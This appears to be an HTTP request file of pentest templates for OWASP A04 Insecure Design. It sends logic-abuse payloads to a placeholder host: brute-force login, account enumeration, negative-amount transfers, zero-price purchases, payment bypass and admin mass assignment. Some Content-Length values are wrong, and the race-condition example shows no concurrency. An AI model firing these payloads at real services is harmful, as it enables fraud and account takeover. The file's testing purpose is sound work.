# OWASP Top 10 - A04:2021 Insecure Design
# Failles de conception

### Missing Rate Limiting - Brute force
POST /api/login HTTP/1.1
Host: {{host}}
Content-Type: application/json
Content-Length: 45

{"username": "admin", "password": "password1"}

### Account Enumeration
POST /api/forgot-password HTTP/1.1
Host: {{host}}
Content-Type: application/json
Content-Length: 30

{"email": "admin@example.com"}

### Predictable Resource Location
GET /invoices/12345.pdf HTTP/1.1
Host: {{host}}

### Missing Business Logic Validation
POST /api/transfer HTTP/1.1
Host: {{host}}
Content-Type: application/json
Content-Length: 55

{"from": "user123", "to": "attacker", "amount": -1000}

### Race Condition - Double spending
POST /api/purchase HTTP/1.1
Host: {{host}}
Content-Type: application/json
Content-Length: 40

{"item_id": 999, "quantity": 1, "price": 0}

### Workflow Bypass - Skip payment
POST /api/orders/confirm HTTP/1.1
Host: {{host}}
Content-Type: application/json
Content-Length: 35

{"order_id": 123, "payment_status": "paid"}

### Mass Assignment
POST /api/users HTTP/1.1
Host: {{host}}
Content-Type: application/json
Content-Length: 75

{"username": "newuser", "email": "user@test.com", "is_admin": true}
